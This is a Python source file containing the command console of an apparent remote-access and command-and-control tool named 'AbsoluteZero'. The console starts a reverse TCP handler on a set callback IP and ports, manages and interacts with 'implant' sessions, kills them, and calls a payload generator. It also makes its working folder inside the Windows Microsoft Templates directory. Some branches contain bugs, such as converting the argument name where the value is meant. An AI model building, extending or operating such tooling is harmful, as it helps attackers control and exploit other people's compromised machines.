import threading
import os
import sys
import help

from core.handler import TCPhandler
from core.color import color
from core.data import viewbag
from core.utils import tools
from payloads import modulehelper
from payloads.builder import payloadgen
from core.data import options

class CLI:
    def __init__(self):
        pass

    @staticmethod
    def InitializeEnvironemnt():
        if os.name == 'nt':
            bfolder = os.getenv('APPDATA') + '\Microsoft\Templates\AbsoluteZero'
        else:
            from os.path import expanduser
            bfolder = expanduser("~") + '/AbsoluteZero'
        tools.mkdir(bfolder)
        viewbag.ENVIRONMENT_FOLDER = bfolder

    @staticmethod
    def console():
        CLI.InitializeEnvironemnt()
        while True:
            try:
                sys.stdout.write(color.ReturnConsole('ab0'))
                command = raw_input('')
                if command.startswith('sessions '):
                    try:
                        if command.split(' ')[1] == "-v":
                            print TCPhandler.Helper.ListSessions()
                            continue
                        _, argument, parameter = command.split(' ')
                        if argument == "-i":
                            TCPhandler.Helper.ImplantInteraction(int(parameter))
                        elif argument == "-k":
                            TCPhandler.Helper.KillImplant(int(parameter))
                            print "\n" + color.ReturnError('Session Index "%s" killed => tcp://%s:%s\n' % (
                                str(parameter), viewbag.all_addresses[int(parameter)][0], viewbag.all_addresses[int(parameter)][1]))
                            TCPhandler.Helper.RemoveSession(int(parameter))
                        else:
                            print color.ReturnError('Invalid argument "%s"' % argument)
                        pass
                    except IndexError:
                        print color.ReturnError('No sessions open at index "%s"\n' % str(parameter))
                    except Exception, e:
                        print color.ReturnError('Console -> ' + str(e))
                elif command == "show options":
                    print options.ShowOptions()
                elif command.startswith('payloadgen'):
                    try:
                        payloadgen.PayloadGenerator.Generate(command)
                    except Exception, e:
                        print color.ReturnError(str(e))
                elif command.startswith('run '):
                    try:
                        _, argument = command.split(' ')
                        if argument == "tcp":
                            if not viewbag.SERVER_STATUS:
                                if not viewbag.PORT_LIST:
                                    print color.ReturnError('Error: port list is empty.')
                                elif not viewbag.CALLBACK_IP:
                                    print color.ReturnError('Error: callback ip is not defined.')
                                else:
                                    print ''
                                    print color.ReturnInfo('Started Reverse TCP Handler on %s:%s\n' % (
                                        viewbag.CALLBACK_IP, TCPhandler.Helper.GetPrintablePorts()))

                                    thread = threading.Thread(target=TCPhandler.Helper.StartTcpHandler)
                                    thread.daemon = True
                                    thread.start()
                                    viewbag.SERVER_STATUS = True
                            else:
                                print color.ReturnError('Server is already online.')
                        else:
                            print color.ReturnError('Unrecognized argument "%s"' % argument)
                    except Exception, e:
                        print color.ReturnError('Console -> ' + str(e))
                elif command.startswith('set '):
                    try:
                        _, argument, parameter = command.split(' ')
                        if argument == "CALLBACK_IP":
                            TCPhandler.Helper.InitializeIp(parameter)
                        elif argument == "CALLBACK_PORTS":
                            TCPhandler.Helper.InitializePorts(parameter)
                        elif argument == "MAX_CONN":
                            viewbag.MAX_CONN = int(argument)
                            print "MAX_CONN => " + argument
                        elif argument == "MESSAGE_LENGTH_SHOW":
                            viewbag.MESSAGE_LENGTH_SHOW = bool(argument)
                            print "MESSAGE_LENGTH_SHOW => " + argument
                        elif argument == "ENVIRONMENT_FOLDER":
                            if tools.mkdir(argument):
                                viewbag.ENVIRONMENT_FOLDER = argument
                                print "ENVIRONMENT_FOLDER => " + argument
                        else:
                            print color.ReturnError('Unrecognized argument "%s"' % argument)
                    except Exception, e:
                        print color.ReturnError('Console -> ' + str(e))
                elif command == "modules":
                    print "\n" + color.ReturnTabulate(modulehelper.ListModules(), ['Name', 'Description'],
                                                      "simple") + "\n"
                elif command == "exit":
                    TCPhandler.Helper.DisconnectImplants()
                    os._exit(0)
                elif command == "help":
                    print help.help()

                else:
                    print color.ReturnError('Command "%s" unrecognized, type <<help>> for command list.' % command)
            except KeyboardInterrupt:
                print color.ReturnError('Type "exit" to quit.')
